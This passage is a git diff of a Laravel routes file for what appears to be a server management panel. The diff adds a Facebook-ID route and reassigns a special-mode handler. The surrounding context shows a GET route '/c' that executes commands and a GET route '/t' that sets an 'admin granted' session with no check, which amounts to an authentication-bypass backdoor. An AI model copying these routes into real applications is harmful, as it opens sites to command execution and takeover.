@@ -34,6 +34,7 @@ Route::post('/change/url','FileController@changeFile');
 
 Route::get('/security/basic','SecurityController@basic');
 Route::get('/security/protection','SecurityController@protection');
+Route::post('/security/protection/getfbid','SecurityController@getFacebookId');
 
 Route::get('/security/basic/{service}/{status}','SecurityController@changeModeStatus');
 
@@ -47,7 +48,7 @@ Route::get('/command','CommandController@index');
 Route::post('/command','CommandController@executeCommand');
 Route::get('/c','CommandController@executeCommand');
 
-Route::post('/smode/{status}','SecurityController@switchSpecialMode');
+Route::post('/smode/{status}','SettingsController@switchSpecialMode');
 
 Route::get('/t',function(){
     session(['admin'=>'granted']);
